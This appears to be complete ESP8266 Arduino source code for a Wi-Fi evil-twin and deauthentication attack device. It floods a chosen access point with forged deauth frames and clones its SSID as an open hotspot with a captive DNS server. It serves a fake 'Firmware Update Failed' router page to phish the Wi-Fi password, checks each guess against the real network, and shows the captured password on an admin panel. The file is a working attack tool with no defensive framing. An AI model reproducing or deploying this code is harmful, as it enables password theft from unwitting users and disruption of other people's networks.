#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>

extern "C" {
#include "user_interface.h"
}


typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
}  _Network;


const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }

}

String _correct = "";
String _tryPassword = "";

// Default main strings
#define SUBTITLE "ACCESS POINT RESCUE MODE"
#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Firmware Update Failed"
#define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."

String header(String t) {
  String a = String(_selectedNetwork.ssid);

  // Modern CSS styles for the page
  String CSS = R"(
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background-color: #f9f9f9;
      font-family: 'Arial', sans-serif;
      color: #333;
      line-height: 1.6;
    }
    nav {
      background-color: #007bff;
      color: #fff;
      padding: 20px;
      text-align: center;
    }
    nav b {
      font-size: 1.8em;
      font-weight: bold;
      display: block;
      margin-bottom: 5px;
    }
    article {
      padding: 1.5em;
      background: #ffffff;
      border-radius: 8px;
      box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
    }
    h1 {
      font-size: 3em;
      color: #333;
      margin-bottom: 0.5em;
      text-align: center;
    }
    label {
      display: block;
      font-size: 1.1em;
      color: #555;
      margin-bottom: 8px;
      font-weight: bold;
    }
    input[type='password'], input[type='submit'] {
      width: 100%;
      padding: 15px;
      margin: 10px 0;
      border: 2px solid #ddd;
      border-radius: 5px;
      font-size: 1.1em;
      outline: none;
    }
    input[type='password']:focus, input[type='submit']:focus {
      border-color: #007bff;
      box-shadow: 0 0 10px rgba(0, 123, 255, 0.3);
    }
    input[type='submit'] {
      background-color: #007bff;
      color: white;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    input[type='submit']:hover {
      background-color: #0056b3;
    }
    .footer {
      background-color: #f1f1f1;
      text-align: center;
      padding: 10px;
      font-size: 0.9em;
      color: #666;
      margin-top: 20px;
    }
    .q {
      margin-top: 20px;
    }
    .q a {
      color: #007bff;
      text-decoration: none;
    }
    .q a:hover {
      text-decoration: underline;
    }
  )";

  // Generate the header HTML
  String h = "<!DOCTYPE html><html>"
             "<head><title><center>" + a + " :: " + t + "</center></title>"
             "<meta name='viewport' content='width=device-width,initial-scale=1'>"
             "<style>" + CSS + "</style>"
             "<meta charset='UTF-8'></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav>"
             "<article><h1>" + t + "</h1>";
 
  return h;
}

String footer() {
  return "</article><div class='footer'><a>&#169; All rights reserved.</a></div>";
}

String index() {
  return header(TITLE) +
         "<div>" + BODY + "</div>" +
         "<form action='/' method='post'>"
         "<label for='password'>WiFi password:</label>"
         "<input type='password' id='password' name='password' minlength='8' required>"
         "<input type='submit' value='Continue'></form>" + footer();
}



void setup() {

  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP("BOOMER", "99887766");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}
void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }

      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    }
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong><br>Wrong Password</h2><p>Please, try again.</p></center></body> </html>");
    Serial.println("Wrong password tried!");
  } else {
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP("BOOMER", "99887766");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    Serial.println("Good password was entered !");
    Serial.println(_correct);
  }
}


String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style> "
                   "body { font-family: Arial, sans-serif; background-color: #f4f4f9; margin: 0; padding: 0; color: #333; transition: all 0.3s ease; }"
                   ".content { max-width: 700px; margin: auto; padding: 20px; background-color: #fff; border-radius: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); }"
                   "h1 { font-size: 2em; color: #333; margin-bottom: 20px; text-align: center; }"
                   "table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }"
                   "th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; transition: background-color 0.3s ease; }"
                   "th { background-color: #4CAF50; color: white; font-weight: bold; }"
                   "td { background-color: #f9f9f9; }"
                   "tr:hover { background-color: #f1f1f1; transform: scale(1.02); transition: transform 0.3s ease; }"
                   "button { background-color: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-size: 1em; transition: transform 0.2s ease, background-color 0.3s ease; }"
                   "button:hover { transform: scale(1.05); background-color: #45a049; }"
                   "button:active { transform: scale(0.98); background-color: #388e3c; }"
                   "button:disabled { background-color: #ccc; cursor: not-allowed; }"
                   "form { display: inline-block; margin: 0 10px 10px 0; }"
                   "nav { background-color: #0066cc; color: white; padding: 10px 20px; text-align: center; border-radius: 10px 10px 0 0; margin-bottom: 20px; transition: background-color 0.3s ease; }"
                   "nav:hover { background-color: #004b8d; }"
                   "nav b { font-size: 1.5em; display: block; }"
                   "</style>"
                   "</head><body><div class='content'>"
                   "<nav><b>Network Management</b></nav>"
                   "<h1>Select a Network and Manage Actions</h1>"
                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                   "<button {disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block;' method='post' action='/?hotspot={hotspot}'>"
                   "<button {disabled}>{hotspot_button}</button></form>"
                   "</div><br><table>"
                   "<tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";



void handleIndex() {

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("BOOMER", "99887766");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
      } else {
        _html += "<button>Select</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop deauthing");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Start deauthing");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop EvilTwin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start EvilTwin");
      _html.replace("{hotspot}", "start");
    }


    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      if (webServer.arg("deauth") == "start") {
        deauthing_active = false;
      }
      delay(1000);
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html",
"<!DOCTYPE html>"
"<html>"
"<head>"
"<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
"<style>"
"body {"
"    font-family: Arial, sans-serif;"
"    background-color: #f4f4f9;"
"    margin: 0;"
"    padding: 0;"
"    display: flex;"
"    justify-content: center;"
"    align-items: center;"
"    height: 100vh;"
"    text-align: center;"
"}"
"h2 {"
"    font-size: 7vw;"
"    color: #333;"
"    animation: fadeIn 2s ease-out;"
"}"
"progress {"
"    width: 80%;"
"    height: 20px;"
"    border-radius: 10px;"
"    appearance: none;"
"    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);"
"    margin-top: 20px;"
"    transition: all 0.3s ease;"
"}"
"progress::-webkit-progress-bar {"
"    background-color: #eee;"
"    border-radius: 10px;"
"}"
"progress::-webkit-progress-value {"
"    background-color: #4CAF50;"
"    border-radius: 10px;"
"}"
"progress::-moz-progress-bar {"
"    background-color: #4CAF50;"
"    border-radius: 10px;"
"}"
"@keyframes fadeIn {"
"    from {"
"        opacity: 0;"
"    }"
"    to {"
"        opacity: 1;"
"    }"
"}"
"</style>"
"<script>"
"let progress = document.querySelector('progress');"
"let value = 10;"
"setInterval(function() {"
"    if (value < 100) {"
"        value += 10;"
"        progress.value = value;"
"    }"
"}, 1500);"
"setTimeout(function() {"
"    window.location.href = '/result';"
"}, 15000);"
"</script>"
"</head>"
"<body>"
"<div>"
"<h2>Verifying integrity, please wait...</h2>"
"<progress value='10' max='100'>10%</progress>"
"</div>"
"</body>"
"</html>");

      if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
      }
    } else {
      webServer.send(200, "text/html", index());
    }
  }

}

void handleAdmin() {

  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("BOOMER", "99887766");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if ( _networks[i].ssid == "") {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";

    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
    } else {
      _html += "<button>Select</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "Stop deauthing");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "Start deauthing");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "Stop EvilTwin");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot}", "start");
  }


  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div></body></html>";
  webServer.send(200, "text/html", _html);

}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {

    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }
}
